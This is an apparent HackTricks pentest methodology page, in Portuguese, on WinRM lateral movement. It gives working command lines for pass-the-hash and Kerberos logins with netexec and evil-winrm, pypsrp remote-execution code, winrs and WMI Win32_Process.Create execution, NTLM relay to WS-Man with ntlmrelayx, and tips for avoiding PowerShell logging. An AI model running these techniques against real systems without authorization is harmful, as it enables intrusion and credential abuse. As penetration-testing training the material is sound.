# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM é um dos transportes de **lateral movement** mais convenientes em ambientes Windows, pois fornece um shell remoto sobre **WS-Man/HTTP(S)** sem precisar de técnicas de criação de serviços via SMB. Se o alvo expõe **5985/5986** e sua principal tem permissão para usar remoting, muitas vezes é possível passar de "valid creds" para "interactive shell" muito rapidamente.

Para a **enumeração de protocolo/serviço**, listeners, habilitação do WinRM, `Invoke-Command` e uso genérico de clientes, consulte:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Por que operators gostam do WinRM

- Usa **HTTP/HTTPS** em vez de SMB/RPC, então geralmente funciona onde a execução no estilo PsExec é bloqueada.
- Com **Kerberos**, evita enviar credenciais reutilizáveis ao alvo.
- Funciona de forma consistente a partir de **Windows**, **Linux** e ferramentas em **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- O caminho interativo de PowerShell remoting inicia **`wsmprovhost.exe`** no alvo sob o contexto do usuário autenticado, o que é operacionalmente diferente da execução baseada em serviços.

## Modelo de acesso e pré-requisitos

Na prática, o sucesso do lateral movement via WinRM depende de **três** fatores:

1. O alvo possui um **listener do WinRM** (`5985`/`5986`) e regras de firewall que permitem o acesso.
2. A conta consegue **autenticar** no endpoint.
3. A conta tem permissão para **abrir uma sessão de remoting**.

Formas comuns de obter esse acesso:

- **Local Administrator** no alvo.
- Associação ao grupo **Remote Management Users** em sistemas mais recentes ou ao grupo **WinRMRemoteWMIUsers__** em sistemas/componentes que ainda respeitam esse grupo.
- Direitos de remoting delegados explicitamente por meio de descritores de segurança locais / alterações nas ACLs do PowerShell remoting.

Se você já controla uma máquina com direitos de administrador, lembre-se de que também pode **delegar acesso ao WinRM sem associação ao grupo de administradores** usando as técnicas descritas aqui:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Particularidades de autenticação importantes durante o lateral movement

- **Kerberos requer um hostname/FQDN**. Se você se conectar usando um IP, o cliente geralmente fará fallback para **NTLM/Negotiate**.
- Em casos de **workgroup** ou de bordas entre trusts, o NTLM normalmente exige **HTTPS** ou que o alvo seja adicionado a **TrustedHosts** no cliente.
- Com **contas locais** usando Negotiate em um workgroup, as restrições de UAC remoto podem impedir o acesso, a menos que a conta interna Administrator seja usada ou `LocalAccountTokenFilterPolicy=1`.
- O PowerShell remoting usa por padrão o **SPN `HTTP/<host>`**. Em ambientes onde `HTTP/<host>` já está registrado para outra conta de serviço, o Kerberos do WinRM pode falhar com `0x80090322`; use um SPN qualificado pela porta ou alterne para **`WSMAN/<host>`** onde esse SPN existir.<sup>[[3]](#references)</sup>

Se você obtiver credenciais válidas durante um password spraying, validá-las via WinRM costuma ser a maneira mais rápida de verificar se elas permitem obter um shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement de Linux para Windows

### NetExec / CrackMapExec para validação e execução one-shot
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM para shells interativos

`evil-winrm` continua sendo a opção interativa mais conveniente a partir do Linux, pois oferece suporte a **senhas**, **hashes NT**, **tickets Kerberos**, **certificados de cliente**, transferência de arquivos e carregamento em memória de PowerShell/.NET.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Caso específico de Kerberos: `HTTP` vs `WSMAN`

Quando o SPN padrão **`HTTP/<host>`** causar falhas no Kerberos, tente solicitar/usar um **ticket `WSMAN/<host>`** em vez disso. Isso ocorre em configurações corporativas reforçadas ou incomuns, nas quais **`HTTP/<host>`** já está associado a outra conta de serviço.<sup>[[3]](#references)</sup>
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Isso também é útil após o abuso de **RBCD / S4U** quando você forjou ou solicitou especificamente um ticket de serviço **WSMAN**, em vez de um ticket `HTTP` genérico.

### Autenticação baseada em certificado

O WinRM também oferece suporte à **autenticação por certificado do cliente**, mas o certificado deve ser mapeado no alvo para uma **conta local**. De uma perspectiva ofensiva, isso é relevante quando:

- você roubou/exportou um certificado de cliente válido e uma chave privada já mapeados para o WinRM;
- você abusou do **AD CS / Pass-the-Certificate** para obter um certificado para um principal e depois pivotar para outro caminho de autenticação;
- você está operando em ambientes que evitam deliberadamente o remoting baseado em senha.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
O WinRM com certificado de cliente é muito menos comum do que a autenticação com senha/hash/Kerberos, mas, quando existe, pode fornecer um caminho de **lateral movement sem senha** que sobrevive à rotação de senhas.

### Python / automação com `pypsrp`

Se você precisa de automação em vez de um shell de operador, `pypsrp` fornece WinRM/PSRP a partir do Python, com suporte a **NTLM**, **autenticação por certificado**, **Kerberos** e **CredSSP**.<sup>[[2]](#references)</sup>
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
Se você precisar de um controle mais refinado do que o wrapper de alto nível `Client` oferece, as APIs de nível inferior `WSMan` + `RunspacePool` são úteis para dois problemas comuns de operadores:

- forçar **`WSMAN`** como o serviço/SPN do Kerberos em vez da expectativa padrão de **`HTTP`** usada por muitos clientes do PowerShell;
- conectar-se a um **endpoint PSRP** não padrão, como uma configuração de sessão **JEA** / personalizada, em vez de `Microsoft.PowerShell`.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Endpoints PSRP personalizados e JEA são importantes durante o movimento lateral

Uma autenticação WinRM bem-sucedida **não** significa necessariamente que você obterá acesso ao endpoint padrão irrestrito `Microsoft.PowerShell`. Ambientes maduros podem expor **configurações de sessão personalizadas** ou endpoints **JEA** com suas próprias ACLs e comportamento de execução como outro usuário.<sup>[[1]](#references)</sup>

Se você já tem execução de código em um host Windows e quer entender quais superfícies de remoting estão disponíveis, enumere os endpoints registrados:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
Quando houver um endpoint útil, direcione-o explicitamente em vez de usar o shell padrão:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Implicações práticas para offensive:

- Um endpoint **restricted** ainda pode ser suficiente para lateral movement se expuser apenas os cmdlets/functions certos para controle de serviços, acesso a arquivos, criação de processos ou execução arbitrária de comandos .NET / externos.
- Uma role JEA **misconfigured** é especialmente valiosa quando expõe comandos perigosos, como `Start-Process`, wildcards abrangentes, providers com permissão de escrita ou proxy functions personalizadas que permitam escapar das restrições pretendidas.
- Endpoints baseados em **RunAs virtual accounts** ou **gMSAs** alteram o contexto de segurança efetivo dos comandos executados. Em particular, um endpoint baseado em gMSA pode fornecer **network identity no second hop**, mesmo quando uma sessão WinRM normal encontraria o problema clássico de delegation.

## Lateral movement nativo do Windows via WinRM

### `winrs.exe`

`winrs.exe` é integrado ao Windows e é útil quando você quer **execução nativa de comandos via WinRM** sem abrir uma sessão interativa de PowerShell remoting:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Duas flags são fáceis de esquecer e importantes na prática:

- `/noprofile` geralmente é necessário quando o principal remoto **não** é um administrador local.
- `/allowdelegate` permite que o shell remoto use suas credenciais em um **terceiro host** (por exemplo, quando o comando precisa de `\\fileserver\share`).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
Operacionalmente, `winrs.exe` geralmente resulta em uma cadeia de processos remotos semelhante a:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Vale a pena lembrar disso porque é diferente da execução baseada em serviços e das sessões interativas do PSRP.

### `winrm.cmd` / WS-Man COM em vez de PowerShell remoting

Você também pode executar por meio do **transporte WinRM** sem usar `Enter-PSSession`, invocando classes WMI sobre WS-Man. Isso mantém o transporte como WinRM, enquanto a primitiva de execução remota passa a ser **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Essa abordagem é útil quando:

- O **logging do PowerShell** é monitorado rigorosamente.
- Você quer o **transporte WinRM**, mas não um workflow clássico de PS remoting.
- Você está desenvolvendo ou usando ferramentas customizadas em torno do objeto COM **`WSMan.Automation`**.

## NTLM relay to WinRM (WS-Man)

Quando o SMB relay é bloqueado por signing e o LDAP relay é restrito, **WS-Man/WinRM** ainda pode ser um alvo atraente para relay. O `ntlmrelayx.py` moderno inclui servidores de WinRM relay e pode fazer relay para alvos `wsman://` ou `winrms://`.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Duas observações práticas:

- Relay é mais útil quando o alvo aceita **NTLM** e o principal retransmitido tem permissão para usar WinRM.
- O código recente do Impacket trata especificamente solicitações **`WSMANIDENTIFY: unauthenticated`**, para que sondagens no estilo `Test-WSMan` não interrompam o fluxo do relay.

Para restrições de multi-hop após obter uma primeira sessão WinRM, consulte:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Observações sobre OPSEC e detecção

- O **remoting interativo do PowerShell** geralmente cria **`wsmprovhost.exe`** no alvo.
- **`winrs.exe`** normalmente cria **`winrshost.exe`** e, em seguida, o processo filho solicitado.
- Endpoints JEA personalizados podem executar ações como contas virtuais **`WinRM_VA_*`** ou como uma **gMSA** configurada, alterando tanto a telemetria quanto o comportamento de second-hop em comparação com um shell normal no contexto do usuário.<sup>[[1]](#references)</sup>
- Espere telemetria de **logon de rede**, eventos do serviço WinRM e logging operacional/de blocos de script do PowerShell se você usar PSRP em vez de **`cmd.exe`** puro.
- Se você precisar apenas de um único comando, **`winrs.exe`** ou uma execução WinRM one-shot pode ser mais discreta do que uma sessão interativa de remoting de longa duração.
- Se o Kerberos estiver disponível, prefira **FQDN + Kerberos** em vez de IP + NTLM para reduzir tanto problemas de confiança quanto alterações incômodas em **`TrustedHosts`** no cliente.

## Referências

- [1] [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
